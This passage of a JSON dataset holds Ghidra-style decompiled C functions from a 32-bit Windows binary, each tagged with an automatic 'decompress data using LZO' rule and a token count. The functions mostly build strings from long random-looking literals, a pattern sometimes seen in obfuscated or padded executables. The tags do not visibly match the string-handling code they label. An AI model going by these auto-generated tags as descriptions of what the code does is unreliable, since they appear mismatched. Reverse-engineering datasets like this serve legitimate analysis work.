        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00401b9f(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t arg_8h;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_ffffff64;\n    uint auStack124 [2];\n    char *pcStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint uStack72;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack124;\n    uStack24 = 0x44cdb0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 4;\n    pcStack116 = \"ypvyvtlrvsqlrexugz\";\n    auStack124[0] = 0x12;\n    fcn.00402f72();\n    uStack48 = 0;\n    uStack44 = 0xf;\n    uStack64 = 0;\n    uStack20 = 5;\n    fcn.00402f72(0x12, iStack88, \"ypvyvtlrvsqlrexugz\");\n    uStack72 = 0;\n    uStack68 = 0xf;\n    iStack88 = 0;\n    uStack20 = 6;\n    fcn.00402f72(0x12, uStack36, \"ypvyvtlrvsqlrexugz\");\n    if (uStack68 < 0x10) {\ncode_r0x004493a0:\n        if (0xf < uStack44) {\n            in_stack_ffffff64 = uStack44 + 1;\n            arg_8h = uStack64;\n            if (0xfff < in_stack_ffffff64) {\n                arg_8h = *(uStack64 - 4);\n                if (0x1f < (uStack64 - 4) - arg_8h) goto code_r0x004494ac;\n                in_stack_ffffff64 = uStack44 + 0x24;\n            }\n            fcn.00401a32(arg_8h);\n        }\n        *puStack40 = 0;\n        puStack40[4] = 0;\n        puStack40[5] = 0xf;\n        *puStack40 = 0;\n        uStack20 = 5;\n        fcn.00402f72(0x10, in_stack_ffffff64 & 0xffffff00 | uStack64 & 0xff, \"rjldovpvtmoahdud\");\n        if (0xf < uStack92) {\n            iVar2 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar2 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar2))\n            goto code_r0x004494b8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x004494c4;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff64 = uStack68 + 1;\n    iVar2 = iStack88;\n    if (in_stack_ffffff64 < 0x1000) {\ncode_r0x00449394:\n        fcn.00401a32(iVar2);\n        goto code_r0x004493a0;\n    }\n    iVar2 = *(iStack88 + -4);\n    if ((iStack88 + -4) - iVar2 < 0x20) {\n        in_stack_ffffff64 = uStack68 + 0x24;\n        goto code_r0x00449394;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004494ac:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004494b8:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004494c4:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 1184
    },
    "00401c53": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.00401c53(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    float10 fVar3;\n    uint32_t in_stack_ffffff68;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c480;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"lcducmtraacswlbjglnxlujimnmmuomaaznnygplrukbwfdbpsjtelsbdndbvjxfzdqrbismjfqehacecxapwdvkybdfxzpckam\";\n    auStack120[0] = 99;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 5;\n    fcn.00402f72(99, uStack84, \n                 \"lcducmtraacswlbjglnxlujimnmmuomaaznnygplrukbwfdbpsjtelsbdndbvjxfzdqrbismjfqehacecxapwdvkybdfxzpckam\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(99, uStack36, \n                 \"lcducmtraacswlbjglnxlujimnmmuomaaznnygplrukbwfdbpsjtelsbdndbvjxfzdqrbismjfqehacecxapwdvkybdfxzpckam\");\n    if (uStack64 < 0x10) {\ncode_r0x0042d623:\n        if (0xf < uStack40) {\n            in_stack_ffffff68 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff68) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042d7ae;\n                in_stack_ffffff68 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 5;\n        fcn.00402f72(99, in_stack_ffffff68 & 0xffffff00 | uStack84 & 0xff, \n                     \"lcducmtraacswlbjglnxlujimnmmuomaaznnygplrukbwfdbpsjtelsbdndbvjxfzdqrbismjfqehacecxapwdvkybdfxzpckam\"\n                    );\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 6;\n        fcn.00402f72(99, uStack36, \n                     \"lcducmtraacswlbjglnxlujimnmmuomaaznnygplrukbwfdbpsjtelsbdndbvjxfzdqrbismjfqehacecxapwdvkybdfxzpckam\"\n                    );\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0042d7ba;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042d7c6;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042d7d2;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x5421bc;\n    }\n    in_stack_ffffff68 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff68 < 0x1000) {\ncode_r0x0042d617:\n        fcn.00401a32(uVar1);\n        goto code_r0x0042d623;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff68 = uStack64 + 0x24;\n        goto code_r0x0042d617;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042d7ae:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042d7ba:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042d7c6:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042d7d2:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 1542
    },
    "00401c67": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00401c67(uint *param_1, uint param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    uint32_t in_stack_ffffff28;\n    uint32_t in_stack_ffffff40;\n    uint auStack148 [2];\n    char *pcStack140;\n    int32_t iStack136;\n    uint uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint uStack96;\n    uint32_t uStack92;\n    uint *puStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack148;\n    uStack24 = 0x44c5f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack88 = param_1;\n    uStack120 = 0;\n    uStack116 = 0xf;\n    iStack136 = 0;\n    uStack20 = 10;\n    pcStack140 = \"dfqjeciwvkrdptqgczcrgsodwieqrzwwjeitcoifpidicrvgkvaekvbtdethcqfkiojbasgfxqujzzaecemzr\";\n    auStack148[0] = 0x55;\n    fcn.00402f72();\n    uStack96 = 0;\n    uStack92 = 0xf;\n    iStack112 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x62, iStack60, \n                 \"tjqpcbebmtciwdhipcnebthtdqsnbrdtvaiksmbsfecxkivozaikfezmnycnmdsmooncswgavrtiyubxkegurmrhvulihoicoh\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x55, uStack84, \"dfqjeciwvkrdptqgczcrgsodwieqrzwwjeitcoifpidicrvgkvaekvbtdethcqfkiojbasgfxqujzzaecemzr\"\n                );\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x55, uStack36, \"dfqjeciwvkrdptqgczcrgsodwieqrzwwjeitcoifpidicrvgkvaekvbtdethcqfkiojbasgfxqujzzaecemzr\"\n                );\n    if (uStack64 < 0x10) {\ncode_r0x0043196d:\n        if (0xf < uStack40) {\n            in_stack_ffffff40 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff40) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00431cd9;\n                in_stack_ffffff40 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x55, in_stack_ffffff40 & 0xffffff00 | uStack84 & 0xff, \n                     \"dfqjeciwvkrdptqgczcrgsodwieqrzwwjeitcoifpidicrvgkvaekvbtdethcqfkiojbasgfxqujzzaecemzr\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x55, uStack36, \n                     \"dfqjeciwvkrdptqgczcrgsodwieqrzwwjeitcoifpidicrvgkvaekvbtdethcqfkiojbasgfxqujzzaecemzr\");\n        if (0xf < uStack64) {\n            in_stack_ffffff28 = uStack64 + 1;\n            uVar2 = uStack84;\n            if (0xfff < in_stack_ffffff28) {\n                uVar2 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar2) goto code_r0x00431ce5;\n                in_stack_ffffff28 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff28 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff28) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x00431cf1;\n                in_stack_ffffff28 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x62, in_stack_ffffff28 & 0xffffff00 | uStack84 & 0xff, \n                     \"tjqpcbebmtciwdhipcnebthtdqsnbrdtvaiksmbsfecxkivozaikfezmnycnmdsmooncswgavrtiyubxkegurmrhvulihoicoh\"\n                    );\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xd;\n        fcn.00402f72(0x62, uStack36, \n                     \"tjqpcbebmtciwdhipcnebthtdqsnbrdtvaiksmbsfecxkivozaikfezmnycnmdsmooncswgavrtiyubxkegurmrhvulihoicoh\"\n                    );\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x00431cfd;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x00431d09;\n            fcn.00401a32(iVar3);\n        }\n        puStack88[5] = 0xf;\n        puStack88[4] = 5;\n        *puStack88 = 0x65696377;\n        *(puStack88 + 1) = 0x61;\n        if (0xf < uStack92) {\n            iVar3 = iStack112;\n            if ((0xfff < uStack92 + 1) && (iVar3 = *(iStack112 + -4),  0x1f < (iStack112 + -4) - iVar3))\n            goto code_r0x00431d15;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack116) {\n            iVar3 = iStack136;\n            if ((0xfff < uStack116 + 1) && (iVar3 = *(iStack136 + -4),  0x1f < (iStack136 + -4) - iVar3))\n            goto code_r0x00431d21;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar3 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar3 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar3))\n            goto code_r0x00431d2d;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar3 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar3 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar3)) goto code_r0x00431d39;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    in_stack_ffffff40 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff40 < 0x1000) {\ncode_r0x00431961:\n        fcn.00401a32(uVar2);\n        goto code_r0x0043196d;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff40 = uStack64 + 0x24;\n        goto code_r0x00431961;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00431cd9:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00431ce5:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00431cf1:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00431cfd:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00431d09:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00431d15:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00431d21:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00431d2d:\n    uStack20 = 8;\n    fcn.004047f5();\ncode_r0x00431d39:\n    uStack20 = 9;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar1 = fcn.00403a76();\n    return puVar1;\n}\n",
        "token_count": 2692
    },
    "00401c6c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00401c6c(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint auStack96 [2];\n    char *pcStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack96;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x414970;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    pcStack88 = \"heqtwxwetmiycyzrikhzqwpjcmasaflkbwicqaeivdecxsqubfppfvjdcbjhoglwbchfjqlnn\";\n    auStack96[0] = 0x49;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x13, uStack36, \"kwtrzxocgrzdmnrpify\");\n    if (0xf < uStack40) {\n        iVar1 = iStack60;\n        if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x00411409;\n        }\n        fcn.00401a32(iVar1);\n    }\n    if (0xf < uStack64) {\n        iVar1 = iStack84;\n        if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1)) {\ncode_r0x00411409:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar2 = fcn.00403a76();\n            return fVar2;\n        }\n        fcn.00401a32(iVar1);\n    }\n    *in_FS_OFFSET = piStack28;\n    return *0x4ea3e4;\n}\n",
        "token_count": 611
    },
    "00402a18": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00402a18(void)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    float10 in_ST0;\n    float10 fVar3;\n    uint32_t in_stack_00000010;\n    uint in_stack_00000020;\n    uint32_t in_stack_00000024;\n    uchar *in_stack_00000040;\n    uint32_t in_stack_00000054;\n    int32_t aiStack116 [4];\n    uint uStack100;\n    uint32_t uStack96;\n    uchar uStack92;\n    int32_t *piStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint32_t uStack68;\n    int32_t iStack52;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &stack0x00000004;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c040;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack68 = unaff_EDI;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000024 < 0x10) {\ncode_r0x0041fbb4:\n        ppuStack32 = ppuVar1;\n        in_stack_00000020 = 0;\n        in_stack_00000024 = 0xf;\n        in_stack_00000010 = in_stack_00000010 & 0xffffff00;\n        if (in_stack_00000054 < 0x10) {\ncode_r0x0041fbfa:\n            *in_FS_OFFSET = piStack28;\n            return in_ST0;\n        }\n        puStack72 = in_stack_00000040;\n        if ((in_stack_00000054 + 1 < 0x1000) ||\n           (puStack72 = *(in_stack_00000040 + -4),  in_stack_00000040 + (-4 - puStack72) < 0x20)) {\n            in_ST0 = fcn.00401a32(puStack72);\n            goto code_r0x0041fbfa;\n        }\n    }\n    else {\n        uStack68 = in_stack_00000010;\n        if ((in_stack_00000024 + 1 < 0x1000) ||\n           (uStack68 = *(in_stack_00000010 - 4),  unaff_EDI = uStack68,  (in_stack_00000010 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            in_ST0 = fcn.00401a32(uStack68);\n            uStack68 = unaff_EDI;\n            ppuVar1 = ppuStack32;\n            goto code_r0x0041fbb4;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    piStack88 = aiStack116;\n    uStack80 = 0x44c050;\n    piStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack84;\n    uStack100 = 0;\n    uStack96 = 0xf;\n    aiStack116[0] = 0;\n    uStack76 = 2;\n    fcn.00402f72(0x4d, uStack92, \"jnoznwpyknggsqmfmdgajutncrdqzatsiskorgfjciadrdcwkjenjsqbpogkbalwdlyiygcwfzrfw\");\n    if (0xf < uStack96) {\n        iVar2 = aiStack116[0];\n        if ((0xfff < uStack96 + 1) && (iVar2 = *(aiStack116[0] + -4),  0x1f < (aiStack116[0] + -4) - iVar2)) {\n            uStack76 = 0;\n            fcn.004047f5();\n            goto code_r0x0041fd4d;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < ppuStack32) {\n        iVar2 = iStack52;\n        if ((0xfff < ppuStack32 + 1) && (iVar2 = *(iStack52 + -4),  0x1f < (iStack52 + -4) - iVar2)) {\ncode_r0x0041fd4d:\n            uStack76 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            fVar3 = fcn.00403a76();\n            return fVar3;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack84;\n    return *0x541f58;\n}\n",
        "token_count": 1168
    },
    "00401d66": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401d66(uint param_1, uint param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    int32_t in_stack_0000002c;\n    uint32_t in_stack_00000040;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x44c830;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 6;\n    pcStack136 = \"vwyeyurgaybvskizrnlgkgccmvwtpxlrpy\";\n    auStack144[0] = 0x22;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 7;\n    fcn.00402f72(0x1d, iStack60, \"bnbecfbjzytwnqdqdrhmpvncunpql\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x22, iStack108, \"vwyeyurgaybvskizrnlgkgccmvwtpxlrpy\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x22, uStack36, \"vwyeyurgaybvskizrnlgkgccmvwtpxlrpy\");\n    if (uStack88 < 0x10) {\ncode_r0x0043838e:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004384ec;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x004384f8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00438504;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000020) {\n            iVar2 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar2 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar2))\n            goto code_r0x00438510;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000040) {\n            iVar2 = in_stack_0000002c;\n            if ((0xfff < in_stack_00000040 + 1) &&\n               (iVar2 = *(in_stack_0000002c + -4),  0x1f < (in_stack_0000002c + -4) - iVar2)) goto code_r0x0043851c;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0xfaac;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x0043838e;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004384ec:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004384f8:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00438504:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00438510:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0043851c:\n    uStack20 = 5;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1333
    },
    "00401ec9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t * __thiscall fcn.00401ec9(uint32_t *param_1, uint32_t param_2, uint param_3, int32_t param_4, uchar param_5)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t **in_FS_OFFSET;\n    uint32_t uStack40;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e4e0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uVar7 = param_1[4];\n    uStack40 = 0x7fffffff;\n    if (0x7fffffff - uVar7 < param_2) {\n        fcn.004038aa();\n    }\n    else {\n        param_2 = param_2 + uVar7;\n        uVar1 = param_1[5];\n        uVar6 = param_2 | 0xf;\n        uVar3 = 0x80000000;\n        if ((uVar6 < 0) || ((uVar1 >> 1 ^ 0x7fffffff) < uVar1)) {\ncode_r0x0041d967:\n            iVar4 = fcn.004024b9(uVar3 + 0x23, param_2);\n            uVar3 = iVar4 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar4;\n        }\n        else {\n            uStack40 = (uVar1 >> 1) + uVar1;\n            if (uStack40 <= uVar6) {\n                uStack40 = uVar6;\n            }\n            uVar3 = uStack40 + 1;\n            if (0xfff < uVar3) {\n                if (0xffffffdc < uVar3) goto code_r0x0041da5d;\n                goto code_r0x0041d967;\n            }\n            if (uVar3 == 0) {\n                uVar3 = 0;\n                uStack40 = 0xffffffff;\n            }\n            else {\n                uVar3 = fcn.004024b9(uVar3, param_2);\n            }\n        }\n        param_1[4] = param_2;\n        param_1[5] = uStack40;\n        if (uVar1 < 0x10) {\n            fcn.0040576d(uVar3, param_1, uVar7);\n            fcn.0040314d(uVar3 + uVar7, param_5, param_4);\n            *(uVar3 + uVar7 + param_4) = 0;\ncode_r0x0041da15:\n            *param_1 = uVar3;\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uVar6 = *param_1;\n        fcn.0040576d(uVar3, uVar6, uVar7);\n        fcn.0040314d(uVar3 + uVar7, param_5, param_4);\n        *(uVar3 + uVar7 + param_4) = 0;\n        uVar7 = uVar6;\n        if ((uVar1 + 1 < 0x1000) || (uVar7 = *(uVar6 - 4),  (uVar6 - 4) - uVar7 < 0x20)) {\n            fcn.00401a32(uVar7);\n            goto code_r0x0041da15;\n        }\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041da5d:\n    fcn.004050bf();\n    fcn.004052d1();\n    pcVar2 = swi(3);\n    puVar5 = (*pcVar2)();\n    return puVar5;\n}\n",
        "token_count": 910
    },
    "00401ee2": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
